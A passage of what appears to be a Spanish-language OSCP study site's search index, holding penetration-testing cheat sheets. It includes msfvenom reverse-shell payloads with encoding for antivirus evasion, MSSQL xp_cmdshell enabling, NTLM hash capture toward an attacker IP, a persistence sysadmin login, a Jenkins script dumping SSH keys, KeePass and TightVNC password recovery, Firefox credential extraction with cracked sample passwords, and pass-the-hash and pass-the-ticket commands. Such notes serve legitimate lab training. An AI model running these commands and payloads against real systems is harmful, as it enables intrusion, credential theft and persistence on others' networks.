payloads","text":""},{"location":"OSCP/msf/#para-listar-encoders-msfvenom-l-encoders","title":"Para listar encoders: <code>msfvenom -l encoders</code>","text":""},{"location":"OSCP/msf/#para-generar-un-payload-encodeado","title":"Para generar un payload encodeado","text":"<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe</code></p>"},{"location":"OSCP/msf/#ofuscaciones-extras-a-investigar","title":"Ofuscaciones extras (A investigar)","text":"<ul> <li>Modifica manualmente el payload: Cambia peque\u00f1as partes del c\u00f3digo para evitar patrones detectables.</li> <li>Compila un stub personalizado: Escribe un programa en C/C++ o Python que desempaquete y ejecute el payload en memoria (t\u00e9cnica de staging).</li> <li>Usa herramientas externas:</li> <li>Veil Framework: Genera payloads ofuscados.</li> <li>Obfuscator.io: Ofusca binarios.</li> <li>Shellter: Inyecta payloads din\u00e1micos en ejecutables leg\u00edtimos.</li> </ul>"},{"location":"OSCP/msf/#mas-informacion-en-el-sitio-de-htb-academy","title":"M\u00e1s informaci\u00f3n en el sitio de HTB Academy","text":""},{"location":"OSCP/mssql/","title":"MICROSOFT SQL SERVER ATTACKS","text":"<ul> <li>Cuando logramos comprometer credenciales de un usuario de SQL Server, podemos realizar ataques adicionales para obtener acceso a la base de datos o ejecutar comandos en el servidor SQL.</li> </ul>"},{"location":"OSCP/mssql/#vectores-de-ataque","title":"Vectores de ataque","text":"<ul> <li> <p>SQL Injection: Si la aplicaci\u00f3n web es vulnerable a inyecciones SQL, podemos utilizar esta vulnerabilidad para ejecutar comandos SQL arbitrarios y obtener acceso a la base de datos.</p> </li> <li> <p>SQLCMD: Herramienta de l\u00ednea de comandos para interactuar con SQL Server. Permite ejecutar consultas SQL y scripts.</p> </li> <li> <p>xp_cmdshell: Procedimiento almacenado que permite ejecutar comandos del sistema operativo desde SQL Server. Si est\u00e1 habilitado, podemos ejecutar comandos de Windows directamente desde SQL Server.</p> </li> </ul>"},{"location":"OSCP/mssql/#acceso-mediante-impacket-e-intento-de-rce","title":"Acceso mediante impacket e intento de RCE","text":"<ul> <li><code>impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth</code></li> <li>Enumerar directorios: <code>SQL (MANAGER\\Operator  guest@master)&gt; xp_dirtree</code></li> </ul>"},{"location":"OSCP/mssql/#habilitar-xp_cmdshell","title":"Habilitar xp_cmdshell","text":"<ul> <li><code>EXEC sp_configure 'show advanced options', 1;</code></li> <li><code>RECONFIGURE;</code></li> <li><code>EXEC sp_configure 'xp_cmdshell', 1;</code></li> <li><code>RECONFIGURE;</code></li> <li>Entonces ahora: <code>EXEC xp_cmdshell 'whoami';</code></li> </ul>"},{"location":"OSCP/mssql/#exfiltrar-ntlmv2-ssp","title":"Exfiltrar NTLMv2-SSP","text":"<ul> <li><code>sudo responder -I tun0</code></li> <li><code>xp_dirtree \\\\10.10.14.34\\share</code></li> </ul>"},{"location":"OSCP/mssql/#crear-persistencia-en-mssql","title":"Crear persistencia en MSSQL","text":"<ul> <li>Crear un nuevo usuario con privilegios:     <pre><code>CREATE LOGIN [pwned] WITH PASSWORD = 'pass';\nCREATE USER [pwned] FOR LOGIN [pwned];\nEXEC sp_addsrvrolemember 'pwned', 'sysadmin';\n</code></pre></li> <li>Verificar el acceso:     <pre><code>SELECT SYSTEM_USER, USER_NAME();\n</code></pre></li> <li><code>EXEC xp_cmdshell 'net group \"Domain Admins\" manager\\operator /add /domain';</code></li> </ul>"},{"location":"OSCP/mssql/#enumerar-dbs","title":"Enumerar DBs","text":"<ul> <li><code>enum_db</code></li> <li>USE <code>&lt;db&gt;</code>: Cambiar de base de datos</li> <li><code>SELECT name FROM sys.tables;</code></li> <li><code>SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('dbo.&lt;table&gt;');</code></li> <li><code>SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '&lt;table&gt;&gt;';</code></li> <li><code>SELECT TABLE_SCHEMA, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'sysauth';</code></li> <li><code>SELECT * FROM dbo.&lt;table&gt;;</code></li> </ul>"},{"location":"OSCP/mssql/#impersonar-credenciales","title":"Impersonar credenciales","text":"<ul> <li><code>enum_impersonate</code>: esto te va a dar posibles usuarios que podemos impersonar</li> </ul> <pre><code>execute as   database   permission_name   state_desc   grantee          grantor          \n----------   --------   ---------------   ----------   --------------   --------------   \nb'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\\services   hrappdb-reader   \n</code></pre> <ul> <li><code>EXECUTE AS LOGIN = 'hrappdb-reader';</code></li> <li><code>SELECT SYSTEM_USER;</code>: Para chequear</li> </ul> <pre><code>SQL (hrappdb-reader  guest@master)&gt; SELECT SYSTEM_USER;\n[%] SELECT SYSTEM_USER;\n\n--------------   \nhrappdb-reader   \n</code></pre>"},{"location":"OSCP/mssql/#herramientas-utiles","title":"Herramientas utiles","text":"<ul> <li>Impacket</li> <li>PowerUpSQL</li> <li>Metasploit <code>exploit/windows/mssql/mssql_payload</code></li> </ul>"},{"location":"OSCP/office/","title":"Office attacks &amp; ODT","text":""},{"location":"OSCP/office/#tools","title":"Tools","text":"<ul> <li>Bad ODT get netNTLM with ODT file<ul> <li>other bad ODT for getting NTLM hashes</li> </ul> </li> <li>Macro reverse shell for documents<ul> <li>same as ^</li> </ul> </li> </ul>"},{"location":"OSCP/office/#shellcode-runner","title":"ShellCode Runner","text":"<ul> <li>https://arttoolkit.github.io/wadcoms/ShellcodeRunner-VBA/</li> </ul>"},{"location":"OSCP/otherWebAttacks/","title":"Other Web Attacks (HTTP verb Tampering, IDOR &amp; XXE)","text":"<ul> <li>HTTP verb tampering</li> <li>IDOR (Insecure Direct Object Reference)</li> <li>XXE (XML External Entity)</li> <li>Attacking Jenkins</li> <li>SSRF</li> <li>ImageMagick RCE</li> <li>Podemos utilizar XXEinjector para automatizar el proceso de inyecci\u00f3n de XML externa.</li> <li><code>ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter</code> Nos tenemos que guardar la petici\u00f3n HTTP de burp</li> </ul> <pre><code>POST /blind/submitDetails.php HTTP/1.1\n\nHost: 10.129.197.101\n\nContent-Length: 140\n\nAccept-Language: en-US,en;q=0.9\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\n\nContent-Type: text/plain;charset=UTF-8\n\nAccept: */*\n\nOrigin: http://10.129.197.101\n\nReferer: http://10.129.197.101/\n\nAccept-Encoding: gzip, deflate, br\n\nConnection: keep-alive\n\n\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\nXXEINJECT\n</code></pre>"},{"location":"OSCP/otherWebAttacks/#jenkins-script-que-busca-clave-ssh","title":"Jenkins script que busca clave SSH","text":"<pre><code>import com.cloudbees.plugins.credentials.CredentialsProvider\nimport com.cloudbees.plugins.credentials.common.StandardUsernameCredentials\nimport com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey\nimport hudson.model.*\n\n// Buscar todas las credenciales en el sistema\ndef creds = CredentialsProvider.lookupCredentials(\n    BasicSSHUserPrivateKey.class, \n    Jenkins.instance, \n    null, \n    null\n)\n\n// Iterar sobre las credenciales y mostrar las claves privadas\ncreds.each { cred -&gt;\n    println \"ID: ${cred.id}\"\n    println \"Description: ${cred.description}\"\n    println \"Private Key: ${cred.privateKey}\"\n    println \"----------------------------------------\"\n}\n</code></pre>"},{"location":"OSCP/passAttacks/","title":"Password attacks &amp; Cracking","text":""},{"location":"OSCP/passAttacks/#para-buscar-el-id-de-hashcat","title":"Para buscar el id de hashcat","text":"<ul> <li><code>hashcat --help | grep -i \"NTLM\"</code></li> <li><code>hashcat --help | grep -i \"KeePass\"</code></li> <li>En windows ser\u00eda: <code>.\\hashcat.exe --help | findstr /i \"NTLM\"</code></li> </ul>"},{"location":"OSCP/passAttacks/#ntlm-password-cracking","title":"NTLM password cracking","text":"<ul> <li><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></li> <li>we got some hash with LLMNR poisoning via responder <pre><code>[SMB] NTLMv2-SSP Client   : 172.16.5.130\n[SMB] NTLMv2-SSP Username : INLANEFREIGHT\\backupagent\n[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:&lt;SERVER_CHALLENGE&gt;:&lt;NT_RESPONSE&gt;:&lt;NTLMV2_RESPONSE_BLOB&gt;\n</code></pre></li> <li>save <code>backupagent::INLANEFREIGHT:&lt;SERVER_CHALLENGE&gt;:&lt;NT_RESPONSE&gt;:&lt;NTLMV2_RESPONSE_BLOB&gt;</code> en un <code>.txt</code>.</li> <li>and now run: <code>.\\hashcat.exe -m 5600 -a 0 .\\ntlmv2.txt .\\rockyou.txt</code></li> <li><code>-m 5600</code> especifica que es NTLMv2. <code>-a 0</code> indica un ataque de diccionario. <code>hashes.txt</code> es el archivo con el hash NTLMv2.</li> <li><code>rockyou.txt</code> es el diccionario de contrase\u00f1as.</li> </ul>"},{"location":"OSCP/passAttacks/#example-output","title":"Example output:","text":"<pre><code>PS C:\\Users\\Grunt\\Desktop\\hashcat-6.2.6&gt; .\\hashcat.exe -m 5600 -a 0 .\\ntlmv2.txt .\\rockyou.txt\nhashcat (v6.2.6) starting\n\nhiprtcCompileProgram is missing from HIPRTC shared library.\n\nOpenCL API (OpenCL 2.1 AMD-APP (3628.0)) - Platform #1 [Advanced Micro Devices, Inc.]\n=====================================================================================\n* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 245 MB\n\nDictionary cache hit:\n* Filename..: .\\rockyou.txt\n* Passwords.: 14344384\n* Bytes.....: 139921497\n* Keyspace..: 14344384\n\nBACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f5b84a3c82ce68d2811dcc234f:&lt;NTLMV2_RESPONSE_BLOB&gt;:h1backup55\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\nHash.Target......: BACKUPAGENT::INLANEFREIGHT:d865666f39a9b532:01d7e2f...000000\nTime.Started.....: Thu Jan 16 08:34:36 2025 (1 sec)\nTime.Estimated...: Thu Jan 16 08:34:37 2025 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (.\\rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........: 13202.6 kH/s (5.06ms) @ Accel:1024 Loops:1 Thr:64 Vec:1\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 8257536/14344384 (57.57%)\nRejected.........: 0/8257536 (0.00%)\nRestore.Point....: 7340032/14344384 (51.17%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: ina&amp;alessandro -&gt; estampida02\nHardware.Mon.#1..: Temp: 54c Fan: 36% Util: 26% Core:1408MHz Mem:1742MHz Bus:8\n\nStarted: Thu Jan 16 08:34:22 2025\nStopped: Thu Jan 16 08:34:38 2025\nPS C:\\Users\\Grunt\\Desktop\\hashcat-6.2.6&gt;\n</code></pre>"},{"location":"OSCP/passAttacks/#crack-keepass-database","title":"Crack keepass database","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/boxes/Keeper]\n\u2514\u2500$ ls\npasscodes.kdbx  req.txt\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/boxes/Keeper]\n\u2514\u2500$ keepass2john passcodes.kdbx &gt; keephash.txt\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/boxes/Keeper]\n\u2514\u2500$ ls\nkeephash.txt  passcodes.kdbx  req.txt\n</code></pre> <ul> <li>Ahora con hashcat: <code>hashcat -m 13400 keephash.txt /usr/share/wordlists/rockyou.txt</code></li> <li>o con john: <code>john --wordlist=/usr/share/wordlists/rockyou.txt keephash.txt</code></li> </ul>"},{"location":"OSCP/passAttacks/#buscar-bases-de-datos-de-keepass","title":"Buscar bases de datos de keepass","text":"<ul> <li>Windows: <code>Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code></li> <li>Linux: <code>find / -type f -name \"*.kdbx\" 2&gt;/dev/null</code></li> </ul>"},{"location":"OSCP/passAttacks/#keepass-cve-2023-32784","title":"KEEPASS CVE-2023-32784","text":"<ul> <li>La vulnerabilidad CVE-2023-32784 es una falla en KeePass que permite recuperar la contrase\u00f1a maestra de la memoria. Esta vulnerabilidad afecta a KeePass 2.x, y no requiere la ejecuci\u00f3n de c\u00f3digo en el sistema objetivo. La contrase\u00f1a se puede recuperar desde un volcado de memoria del proceso, archivo de intercambio, archivo de hibernaci\u00f3n, varios volcados de crash o un volcado de RAM del sistema completo.</li> <li>Hay que instalar dotnet</li> </ul> <pre><code># Agregar el repositorio de Microsoft\nwget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\nsudo dpkg -i packages-microsoft-prod.deb\n\n# Instalar el SDK de .NET 7.0\nsudo apt-get update\nsudo apt-get install -y dotnet-sdk-7.0\n</code></pre> <ul> <li>Luego hay que instalar KeePassPasswordDumper</li> <li><code>dotnet run /ruta/al/.dmp</code></li> <li>Luego algun que otro caracter va a quedar mal, pero se puede iterar sobre este caracter con python.<ul> <li>recomiendo utilizar itertools + un string con los caracteres que se quieren probar. </li> </ul> </li> </ul> <pre><code>import itertools\nimport sys\n\ndef generate_combinations(pattern, unknown_chars, output_file):\n    # Lista de caracteres posibles para cada posici\u00f3n de la contrase\u00f1a\n    positions = []\n    for char in pattern:\n        if char == \"\u25cf\":\n            positions.append(unknown_chars)\n        else:\n            positions.append(char)\n\n    # Generar todas las combinaciones posibles\n    with open(output_file, \"w\") as f:\n        for combination in itertools.product(*positions):\n            f.write(''.join(combination) + \"\\n\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(\"Uso: python3 generate_passwords_param.py &lt;pattern&gt; &lt;unknown_chars&gt; &lt;output_file&gt;\")\n        sys.exit(1)\n\n    pattern = sys.argv[1]\n    unknown_chars = sys.argv[2]\n    output_file = sys.argv[3]\n\n    generate_combinations(pattern, unknown_chars, output_file)\n</code></pre> <ul> <li>chars=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"</li> <li>chars+=\"0123456789\"</li> <li>python3 generate_pass.py \"\u25cf\u00f8dgr\u00f8d med fl\u00f8de\" \"$chars\" \"pass.txt\"</li> <li><code>hashcat -m 13400 keephash.txt pass.txt</code></li> <li><code>john --wordlist=pass.txt keephash.txt</code></li> </ul>"},{"location":"OSCP/passAttacks/#about-john-the-ripper","title":"About john the ripper","text":"<ul> <li>The truth is that I don't give much importance to john the ripper, it is a very versatile tool but the power of hashcat is beyond comparison.</li> </ul>"},{"location":"OSCP/passAttacks/#bcrypt-cracking-commands","title":"bcrypt cracking commands","text":"<ul> <li><code>hashcat -m 3200 -a 0 hash.txt rockyou.txt</code></li> </ul>"},{"location":"OSCP/passAttacks/#firefox-password-dumper","title":"Firefox Password dumper","text":"<ul> <li>Primero tenemos que ubicar si la maquina tiene firefox instalado, y si es as\u00ed, tenemos que ubicar el perfil de firefox.</li> <li>Para esto recomiendo utilizar winpeas</li> </ul> <pre><code>  [+] Looking for Firefox DBs\n   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history\n    Firefox credentials file exists at C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\key4.db\n ```\n\n - Una vez que tenemos el perfil, tenemos que copiar la carpeta `br53rxeg.default-release` a nuestra m\u00e1quina. \n - Podemos utilizar [firepwd](https://github.com/lclevy/firepwd) para extraer las contrase\u00f1as.\n\n ```bash\n \u250c\u2500\u2500(kali\u327fkali)-[~/firepwd]\n\u2514\u2500$ python3 firepwd.py\n&lt;SNIP&gt;\ndecrypting login/password pairs\nhttps://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'\nhttps://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'\nhttps://slack.streamio.htb:b'yoshihide',b'paddpadd@12'\nhttps://slack.streamio.htb:b'JDgodd',b'password@12'\n</code></pre>"},{"location":"OSCP/passAttacks/#tightvnc-password-attack","title":"TightVNC password attack","text":"<ul> <li>dentro de los registros de windows, podemos encontrar el tightvnc password en la siguiente ruta:</li> <li>HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server</li> <li>Que va a contener <code>\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></li> <li>En nuestra maquina atcante podemos utilizar un script que usa openssl para desencriptar la contrase\u00f1a</li> </ul> <pre><code>#!/bin/bash\n\n# Clave DES est\u00e1tica usada por TightVNC\nKEY=\"e84ad660c4721ae0\"\n\n# Hex input (ej: 6bcf2a4b6e5aca0f)\nread -p \"Hexadecimal VNC password: \" HEX\n\n# Archivo temporal\nENC_FILE=$(mktemp)\nDEC_FILE=$(mktemp)\n\n# Convertir el hex a binario\necho \"$HEX\" | xxd -r -p &gt; \"$ENC_FILE\"\n\n# Desencriptar con OpenSSL usando DES-ECB\nopenssl enc -d -des-ecb -in \"$ENC_FILE\" -out \"$DEC_FILE\" -K \"$KEY\" -nopad 2&gt;/dev/null\n\n# Mostrar resultado\necho -n \"La contrase\u00f1a es: \"\ncat \"$DEC_FILE\"\necho\n\n# Limpiar archivos temporales\nrm \"$ENC_FILE\" \"$DEC_FILE\"\n</code></pre>"},{"location":"OSCP/passAttacks/#dictionary-attack-con-hydra","title":"Dictionary Attack con hydra","text":"<ul> <li>Comando basico: <code>hydra -l &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; ssh/rdp/etc</code><ul> <li>Generalmente el protocolo ftp es m\u00e1s veloz que ssh, por lo que se recomienda utilizar ftp para hacer pruebas de fuerza bruta.</li> </ul> </li> </ul>"},{"location":"OSCP/passAttacks/#hydra-http-post-form","title":"Hydra HTTP post form","text":"<ul> <li>Abr\u00ed burp y agarr\u00e1 la petici\u00f3n HTTP que quieras atacar.<ul> <li>Revis\u00e1 que el m\u00e9todo sea POST y que tenga un body de incorrecto.</li> </ul> </li> <li><code>hydra -l &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; http-post-form \"/path/to/login:username=^USER^&amp;password=^PASS^:F=incorrect\"</code></li> </ul>"},{"location":"OSCP/passAttacks/#mutating-wordlists","title":"Mutating Wordlists","text":"<ul> <li>Hashcat permite mutar wordlists para generar nuevas contrase\u00f1as a partir de una lista base. Esto es \u00fatil para crear variaciones de contrase\u00f1as comunes.</li> <li>Hay reglas predefinidas que se pueden usar para mutar las contrase\u00f1as. Estas reglas pueden incluir agregar n\u00fameros, cambiar letras por n\u00fameros, etc.</li> <li><code>hastcat -r rules/best64.rule -a 0 -m 0 hash.txt rockyou.txt</code></li> <li><code>hashcat -r rules/best64.rule --stdout wordlist.txt</code>: Esto va a imprimir en pantalla todas las contrase\u00f1as generadas a partir de la wordlist.</li> </ul>"},{"location":"OSCP/passAttacks/#mutacion-de-rockyou","title":"Mutaci\u00f3n de rockyou","text":"<ul> <li><code>PS J:\\hashcat&gt; .\\hashcat.exe -m 0 .\\amy-md5.txt .\\rockyou.txt -r .\\rules\\rockyou-30000.rule</code></li> </ul>"},{"location":"OSCP/passAttacks/#archivos-rule","title":"Archivos .rule","text":"<ul> <li>Los archivos <code>.rule</code> son archivos de texto que contienen reglas para mutar contrase\u00f1as. Cada l\u00ednea del archivo representa una regla.</li> <li>Por ejemplo, una regla puede ser <code>s/abc/123/</code>, que reemplaza todas las ocurrencias de \"abc\" por \"123\" en las contrase\u00f1as.</li> </ul>"},{"location":"OSCP/passAttacks/#tabla-de-reglas-comunes","title":"Tabla de reglas comunes","text":"Regla Descripci\u00f3n <code>$!</code> Agrega un car\u00e1cter especial <code>!</code> al final de la contrase\u00f1a. <code>$1</code> Agrega el n\u00famero <code>1</code> al final de la contrase\u00f1a. <code>^a</code> Agrega la letra <code>a</code> al inicio de la contrase\u00f1a. <code>s/a/A/</code> Reemplaza todas las ocurrencias de <code>a</code> con <code>A</code>. <code>l</code> Convierte toda la contrase\u00f1a a min\u00fasculas. <code>u</code> Convierte toda la contrase\u00f1a a may\u00fasculas. <code>c</code> Capitaliza la primera letra de la contrase\u00f1a. <code>r</code> Invierte el orden de los caracteres en la contrase\u00f1a. <code>d</code> Duplica la contrase\u00f1a. <code>t0</code> Trunca la contrase\u00f1a a 0 caracteres (la vac\u00eda). <code>p1</code> Inserta el n\u00famero <code>1</code> despu\u00e9s de cada car\u00e1cter de la contrase\u00f1a. <code>o</code> Elimina todos los caracteres duplicados en la contrase\u00f1a. <code>x</code> Elimina todos los caracteres no alfanum\u00e9ricos de la contrase\u00f1a. <code>[3]</code> Elimina el car\u00e1cter en la posici\u00f3n 3 (\u00edndice basado en 0). <code>D</code> Elimina todos los d\u00edgitos de la contrase\u00f1a. <code>T0</code> Trunca la contrase\u00f1a despu\u00e9s de 0 caracteres (la vac\u00eda). <code>f</code> Duplica la contrase\u00f1a y la invierte, concaten\u00e1ndola al final. <p>Estas reglas pueden combinarse para crear mutaciones m\u00e1s complejas y personalizadas.</p>"},{"location":"OSCP/passTheHash/","title":"Pass the hash","text":""},{"location":"OSCP/passTheHash/#pass-the-ticket","title":"Pass the ticket","text":""},{"location":"OSCP/passTheHash/#pass-the-ticket-linux","title":"Pass the ticket LINUX","text":"<ul> <li>more info</li> </ul>"},{"location":"OSCP/passTheHash/#espanol","title":"Espa\u00f1ol:","text":""},{"location":"OSCP/passTheHash/#definicion","title":"Definici\u00f3n","text":"<ul> <li>El ataque PTH es una tecnica utilizada para comprometer cuentas en ambientes windows sin tener la necesidad de conocer las contrase\u00f1as en texto plano. En lugar de usar la contrase\u00f1a se utiliza el hash de la misma para autenticarse.</li> </ul>"},{"location":"OSCP/passTheHash/#utilizacion","title":"Utilizaci\u00f3n","text":"<ol> <li>Post explotaci\u00f3n</li> <li>Movimiento lateral: Para moverse lateralmente dentro de una red si la maquina comprometida tiene acceso a recursos compartidos.</li> <li>Escalaci\u00f3n de privilegios</li> </ol>"},{"location":"OSCP/passTheHash/#funcionamiento","title":"Funcionamiento","text":"<ul> <li>Mediante NTLM.</li> <li>NTLM es un protocolo de autenticaci\u00f3n Windows que no requiere la contrase\u00f1a en texto plano para validar autenticaciones (hashes NT).<ul> <li>Obtener hash NT de un usuario (dumping de credenciales con mimikatz x ej).</li> <li>Usar el hash para autenticarse.</li> <li>Acceder a recursos protegidos (smb, rdp, winrm, etc).</li> </ul> </li> </ul>"},{"location":"OSCP/passTheHash/#impacket-con-psexec","title":"Impacket con psexec","text":"<p><code>impacket-psexec administrator@10.129.201.126 -hashes :&lt;NT_HASH&gt;</code> <code>DOMAIN/USER@TARGET -hashes LMHASH:NTHASH</code></p>"},{"location":"OSCP/passTheHash/#mimikatz","title":"Mimikatz","text":"<ul> <li>Permite autenticar usando hashes con el modulo <code>sekurlsa::pth</code> <code>sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:COMMAND</code> <code>sekurlsa::pth /user:admin /domain:. /ntlm:0123456789abcdef0123456789abcdef /run:cmd.exe</code></li> </ul>"},{"location":"OSCP/passTheHash/#crackmapexec","title":"Crackmapexec","text":"<p><code>crackmapexec smb TARGET_IP -u USER -H NTHASH</code> <code>cme smb 192.168.1.10 -u admin -H 0123456789abcdef0123456789abcdef</code></p>"},{"location":"OSCP/passTheHash/#permitir-pth-con-rdp","title":"Permitir Pth con RDP","text":"<p><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code> -  - Una vez de que la llave fue agregada al registro del sistema podemos intntar usar xfreerdp con la opci\u00f3n /pth</p>"},{"location":"OSCP/passTheHash/#activar-rdp-si-esta-desactivado","title":"Activar RDP si est\u00e1 desactivado","text":"<ul> <li><code>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></li> <li><code>netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes</code></li> <li><code>sc config TermService start= auto</code></li> <li><code>net start TermService</code></li> </ul>"},{"location":"OSCP/passTheTicket/","title":"Pass the ticket","text":"<ul> <li>Es una tecnica utilizada en ataques contra kerberos.<ul> <li>En lugar de usar la password o hash de una password, utilizamos el ticket kerberos para autenticarse y tener acceso a recursos protegidos.</li> </ul> </li> <li>El flujo t\u00edpico de Kerberos implica que:</li> <li>Un usuario se autentica con su contrase\u00f1a y recibe un Ticket Granting Ticket (TGT).</li> <li>Con el TGT, el usuario solicita un Service Ticket (TGS) para acceder a servicios espec\u00edficos (como SMB, HTTP, etc.).</li> </ul>"},{"location":"OSCP/passTheTicket/#diferencia-con-pass-the-hash","title":"Diferencia con Pass The Hash","text":"<ul> <li>PTH es para NTLM</li> </ul>"},{"location":"OSCP/passTheTicket/#para-obtener-y-manipular-estos-tickets-yo-prefiero-rubeus-ante-todo-pero-mimikatz-tambien-es-una-buena-opcion","title":"Para obtener y manipular estos tickets yo prefiero Rubeus ante todo, pero mimikatz tambi\u00e9n es una buena opci\u00f3n.","text":""},{"location":"OSCP/passTheTicket/#exportar-tickets","title":"Exportar tickets","text":"<ul> <li><code>Rubeus.exe dump /nowrap</code></li> </ul>"},{"location":"OSCP/passTheTicket/#pass-the-ticket-formato-base64","title":"Pass The Ticket formato base64","text":"<ul> <li><code>Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/</code></li> </ul>"},{"location":"OSCP/passTheTicket/#movimiento-lateral-con-pass-the-ticket","title":"Movimiento lateral con Pass the Ticket","text":"<ul> <li><code>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show</code></li> </ul>"},{"location":"OSCP/passTheTicket/#ejemplo-sacado-de-un-laboratorio","title":"Ejemplo sacado de un laboratorio","text":"<ul> <li>Importo el ticket</li> <li>Me conecto a otra computadora dentro de la red AD</li> </ul> <pre><code>C:\\tools&gt;Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6yFGd0R+uMeD0dWGow5p9KhUM8rPUeWQl1DSxyzR7pXLvFcabDnKxz9zWjvbgszJQ2qnrcnx7cpgCiRC759NvVnVRNo3Kd76PpQlJZ43DKcg5Cmkat76mx/Rz13ohmvlv4yaP0W04ckk3KoAKghKt9a70WUkNB/pg+WruCqnYwj3MFgxJhTTEaKduLUnGqoEabe25oM928xV32jeVZxDRK6ON30nOtnUsdZy0iwAg5rhNPfHTbydm4Z+mn3IThaVcz1VxtKP2I7L0JZEDhOM7ZPyp5DaQm1LsZTpiexXD0A6bm8/c/GruNJyuDVYVsfAuki9G/oyRZKsqRhg3RGaOU5uIC1ReDDqmIrE+7dha9kAgH8Kk1KzoK2sT38NZe0vC3zH+NzVB6VVvjCu/b5sLpcKXkLsOgTXhonubBkS39qwwEjm3d5iURMfyRwiRfpHnrlOtb6LdrtfpT++qzpdSK06D8sPpOVnBJ8ieNBNwOIHtMVw6X5XQalgZvA27s9ZCygwpXJUWuOo3hMcHSmihg9nlTNFb0HPGKQeV2Et1kKYffY1uG5iuxCBXbi6q5RO7fHtFysOJA5Tb05fXTfqbvRy6KCDyq7DcR68wzHucVBj39Tj5jlzmzL1PLOcB3W8PKW6win21TDgRBSYBD0v78jKFlrwdyu85PvPC3om/GvDDZAgk207dobYcMsT524wJpnIzVjZ/UV3RM9b5jlOtkj0j4ylDJ3gYdnha0yTkR73U1kiam48TgGBgQNy6EhCoij+YGqF/cmi7uMyDVwKWJKuoTxMZek/qKn3Qi6lxLaGxB5a2yS1uRgUK6f2AuWnT6sZZg6ymLC1jCvuhVkvlFbNpdwoqKaph9JZvvoBLZqOBRwPqMNaxK0WcRf6qxUNNhg0I5JHIY6DY00rK0bgckaNvPW/KdjzCbij2JhFADRVqTavob63bu3h81ekaXpfXsoEJPgPURqcKaMUJpCX9U7AA/2S/tkT+bIkoJEjkKiHrjcroB/8iuOvZ8tyFajP0uYDlXwZOZ+pMrNt3I9O0zIlaMikV8L3zOdz3c2C2cSzSvEtwFpCC